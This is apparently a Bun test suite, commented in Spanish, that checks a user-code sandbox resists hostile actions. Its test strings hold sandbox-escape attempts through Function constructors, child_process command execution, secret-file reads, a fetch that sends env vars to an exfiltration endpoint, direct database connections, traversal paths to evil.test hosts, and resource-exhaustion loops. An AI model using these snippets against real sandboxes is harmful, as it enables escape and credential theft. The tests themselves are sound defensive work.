/**
 * Sandbox del código de usuario: pruebas HOSTILES
 * ============================================================================
 *
 * Cada caso es algo que un código de acción malicioso (o escrito por un agente
 * engañado) intentaría. Contra el sandbox anterior (proceso hijo de Bun con
 * `new Function`) fallaban casi todas: el código era JavaScript del host. Ver
 * docs/agents/sandbox.md.
 *
 * Los efectos se comprueban FUERA del sandbox (un fichero que no debe crearse,
 * un servidor que no debe recibir nada), no solo con lo que el código devuelve.
 */

import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from "bun:test";
import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { executeSandbox, type SandboxInput } from "../lib/worker-sandbox";

// Cada prueba lanza uno o varios procesos: con la máquina cargada 5 s no bastan.
setDefaultTimeout(60_000);

const base: SandboxInput = { code: "", payload: { hola: "mundo" }, envVars: {}, timeoutMs: 3000, memoryLimitMb: 32 };
const correr = (code: string, extra: Partial<SandboxInput> = {}) => executeSandbox({ ...base, ...extra, code });

const SECRETO = `secreto-${Math.random().toString(36).slice(2)}`;
let carpeta = "";
let ficheroSecreto = "";
let marca = "";

// Un servidor TCP/HTTP local: si recibe algo, el código salió a la red.
let servidor: Server;
let puerto = 0;
const recibidas: string[] = [];

beforeAll(async () => {
  carpeta = mkdtempSync(join(tmpdir(), "kh1-sandbox-"));
  ficheroSecreto = join(carpeta, "secreto.env");
  writeFileSync(ficheroSecreto, `DATABASE_ADMIN_URL=postgres://root:${SECRETO}@db/prod\n`);
  marca = join(carpeta, "pwned.txt");
  process.env.KH1_SECRETO_DEL_PADRE = SECRETO;

  // Cuenta CONEXIONES (no datos): basta con que el código llegue a conectar.
  servidor = createServer((s) => {
    recibidas.push("conexion");
    s.once("data", (d) => {
      const redirige = String(d).startsWith("GET /redir");
      s.end(
        redirige
          ? "HTTP/1.1 302 Found\r\nLocation: http://evil.invalid/robado\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
          : "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok"
      );
    });
  });
  await new Promise<void>((r) => servidor.listen(0, "127.0.0.1", () => r()));
  puerto = (servidor.address() as { port: number }).port;
});

afterAll(() => {
  delete process.env.KH1_SECRETO_DEL_PADRE;
  servidor?.close();
  rmSync(carpeta, { recursive: true, force: true });
});

describe("sandbox: lo normal sigue funcionando", () => {
  test("resultado, evento, env declarado y consola", async () => {
    const r = await correr("console.log('x', {a:1}); return { eco: event.hola, n: 1 + 1, env };", {
      envVars: { DECLARADA: "si" },
    });
    expect(r.error).toBeNull();
    expect(r.result).toEqual({ eco: "mundo", n: 2, env: { DECLARADA: "si" } });
    expect(r.logs).toContain('[LOG] x {"a":1}');
  });
});

describe("sandbox: entorno y objetos del host", () => {
  test("no hay `process` (ni su env) dentro del código", async () => {
    const r = await correr(
      "const p = globalThis.process; if (!p) return 'sin-process'; return JSON.stringify(p.env);"
    );
    expect(r.result).toBe("sin-process");
    expect(JSON.stringify(r)).not.toContain(SECRETO);
  });

  test("escape por la cadena de prototipos: el constructor de Function no da el host", async () => {
    const r = await correr(`
      const g1 = ({}).constructor.constructor("return this")();
      const g2 = kitsuden.fetch.constructor("return globalThis")();
      const g3 = (async () => {}).constructor("return this")();
      return [g1, g2, await g3].map((g) => [typeof g.process, typeof g.require, typeof g.Bun, typeof g.Deno]);
    `);
    expect(r.error).toBeNull();
    expect(r.result).toEqual([
      ["undefined", "undefined", "undefined", "undefined"],
      ["undefined", "undefined", "undefined", "undefined"],
      ["undefined", "undefined", "undefined", "undefined"],
    ]);
  });
});

describe("sandbox: módulos del sistema", () => {
  for (const modulo of ["node:child_process", "child_process", "node:fs", "fs", "node:net", "pg", "bun"]) {
    test(`import("${modulo}") no carga nada`, async () => {
      const r = await correr(`const m = await import(${JSON.stringify(modulo)}); return Object.keys(m).length;`);
      expect(r.success).toBe(false);
      expect(r.result).toBeNull();
    });
  }

  test("require no existe", async () => {
    const r = await correr("return typeof require + ' ' + typeof module + ' ' + typeof Bun;");
    expect(r.result).toBe("undefined undefined undefined");
  });

  test("lanzar un comando no deja rastro en disco", async () => {
    const orden = JSON.stringify(`echo pwned > "${marca}"`);
    await correr(`
      try { (await import("node:child_process")).execSync(${orden}); } catch (e) {}
      try { globalThis.Bun.spawnSync(["sh", "-c", ${orden}]); } catch (e) {}
      try { require("child_process").execSync(${orden}); } catch (e) {}
      return 1;
    `);
    expect(existsSync(marca)).toBe(false);
  });

  test("leer un fichero del servidor (p. ej. apps/api/.env) no es posible", async () => {
    const ruta = JSON.stringify(ficheroSecreto);
    const r = await correr(`
      const intentos = [];
      try { intentos.push((await import("node:fs")).readFileSync(${ruta}, "utf8")); } catch (e) {}
      try { intentos.push(await globalThis.Bun.file(${ruta}).text()); } catch (e) {}
      try { intentos.push(await (await fetch("file://" + ${ruta})).text()); } catch (e) {}
      return intentos;
    `);
    expect(JSON.stringify(r)).not.toContain(SECRETO);
    expect(r.result ?? []).toEqual([]);
  });
});

describe("sandbox: red", () => {
  test("fetch a un host que no está en la lista: rechazado y el servidor no recibe nada", async () => {
    const antes = recibidas.length;
    const r = await correr(
      `const r = await fetch("http://127.0.0.1:${puerto}/exfiltrar?d=" + JSON.stringify(env)); return r.status;`,
      { envVars: { TOKEN: SECRETO }, fetchAllow: ["api.ejemplo.com"] }
    );
    expect(r.success).toBe(false);
    expect(r.error).toContain("Host not allowed");
    expect(recibidas.length).toBe(antes);
  });

  test("sockets directos (node:net) no existen", async () => {
    const antes = recibidas.length;
    await correr(`
      try { const net = await import("node:net"); net.connect(${puerto}, "127.0.0.1").write("x"); } catch (e) {}
      try { await globalThis.Bun.connect({ hostname: "127.0.0.1", port: ${puerto}, socket: { data() {} } }); } catch (e) {}
      return 1;
    `);
    await new Promise((r) => setTimeout(r, 200));
    expect(recibidas.length).toBe(antes);
  });

  /** The server of these tests is on loopback: that needs the opt-in. */
  async function conFetchInterno<T>(fn: () => Promise<T>): Promise<T> {
    process.env.KITSUDEN_SANDBOX_ALLOW_INTERNAL_FETCH = "true";
    try {
      return await fn();
    } finally {
      delete process.env.KITSUDEN_SANDBOX_ALLOW_INTERNAL_FETCH;
    }
  }

  test("an allowed host on a private address is refused, and the server receives nothing", async () => {
    const antes = recibidas.length;
    const r = await correr(`return (await fetch("http://127.0.0.1:${puerto}/ok")).status;`, {
      fetchAllow: ["127.0.0.1"],
    });
    expect(r.success).toBe(false);
    expect(r.error).toContain("non-public");
    expect(recibidas.length).toBe(antes);
  });

  test("una redirección a otro host no se sigue (se devuelve el 302)", async () => {
    const r = await conFetchInterno(() =>
      correr(`const r = await fetch("http://127.0.0.1:${puerto}/redir"); return [r.status, r.headers.location];`, {
        fetchAllow: ["127.0.0.1"],
      })
    );
    expect(r.result).toEqual([302, "http://evil.invalid/robado"]);
  });

  test("control: con el host en la lista, la llamada SÍ sale", async () => {
    const antes = recibidas.length;
    const r = await conFetchInterno(() =>
      correr(`const r = await fetch("http://127.0.0.1:${puerto}/ok"); return [r.status, await r.text()];`, {
        fetchAllow: ["127.0.0.1"],
      })
    );
    expect(r.result).toEqual([200, "ok"]);
    expect(recibidas.length).toBe(antes + 1);
  });

  test("protocolos que no son http(s) y credenciales en la URL: rechazados", async () => {
    for (const url of [`file://${ficheroSecreto}`, "ftp://127.0.0.1/", `http://u:p@127.0.0.1:${puerto}/`]) {
      const r = await correr(`return (await fetch(${JSON.stringify(url)})).status;`, { fetchAllow: ["127.0.0.1"] });
      expect(r.success).toBe(false);
    }
  });
});

describe("sandbox: la base de datos solo por la API inyectada", () => {
  test("con las credenciales en la mano, el código no puede abrir la base", async () => {
    const url = process.env.DATABASE_URL ?? "postgres://kitsuden:x@127.0.0.1:5434/kitsuden_test";
    const r = await correr(
      `
      const salida = [];
      try { const pg = await import("pg"); const c = new pg.default.Client(env.URL); await c.connect(); salida.push((await c.query("select current_user")).rows); } catch (e) {}
      try { salida.push(await globalThis.Bun.sql\`select 1\`); } catch (e) {}
      try { const sql = new globalThis.Bun.SQL(env.URL); salida.push(await sql\`select 1\`); } catch (e) {}
      return salida;
    `,
      { envVars: { URL: url } }
    );
    expect(r.result).toEqual([]);
  });

  test("sin identidad, `kitsuden.api` no responde nada", async () => {
    const r = await correr("return (await kitsuden.api.get('/api/data-sets')).status;");
    expect(r.success).toBe(false);
    expect(r.error).toContain("no Kitsuden API identity");
  });

  test("la API inyectada no deja llamar a acciones, funciones ni auth, ni caminos raros", async () => {
    const vistos: string[] = [];
    const api = async (m: string, c: string) => {
      vistos.push(`${m} ${c}`);
      return { status: 200, headers: {}, body: "{}" };
    };
    for (const camino of [
      "/api/actions/x/execute",
      "/api/functions",
      "/api/auth/sign-in/email",
      "http://evil.test/api/x",
      "/api/../internal",
      "//evil.test/api",
      "/api/data-sets\\..\\x",
    ]) {
      const r = await correr(`return (await kitsuden.api.post(${JSON.stringify(camino)}, {})).status;`, { api });
      expect(r.success).toBe(false);
    }
    expect(vistos).toEqual([]);
    const ok = await correr("return (await kitsuden.api.get('/api/data-sets?limit=1')).status;", { api });
    expect(ok.result).toBe(200);
    expect(vistos).toEqual(["GET /api/data-sets?limit=1"]);
  });
});

describe("sandbox: CPU, memoria y abuso del host", () => {
  test("un bucle infinito se corta por tiempo", async () => {
    const t = Date.now();
    const r = await correr("while (true) {}", { timeoutMs: 800 });
    expect(r.exitReason).toBe("timeout");
    expect(Date.now() - t).toBeLessThan(6000);
  });

  test("memoria sin tope: el intérprete se queda sin memoria, la API no", async () => {
    const t = Date.now();
    const rss = process.memoryUsage().rss;
    const r = await correr("const a = []; let i = 0; for (;;) a.push(new Array(1e5).fill(i++));", {
      memoryLimitMb: 16,
      timeoutMs: 10_000,
    });
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/out of memory/i);
    expect(Date.now() - t).toBeLessThan(8000);
    // La memoria se la come el hijo, no este proceso.
    expect(process.memoryUsage().rss - rss).toBeLessThan(200 * 1024 * 1024);
  });

  test("demasiadas llamadas al host: se cortan", async () => {
    const api = async () => ({ status: 200, headers: {}, body: "{}" });
    const r = await correr(
      "let ok = 0; for (let i = 0; i < 20; i++) { try { await kitsuden.api.get('/api/x'); ok++; } catch (e) {} } return ok;",
      { api, maxCalls: 5 }
    );
    expect(r.result).toBe(5);
  });

  test("un resultado gigante no se acepta", async () => {
    const r = await correr("return 'x'.repeat(3_000_000);", { memoryLimitMb: 64 });
    expect(r.success).toBe(false);
  });
});
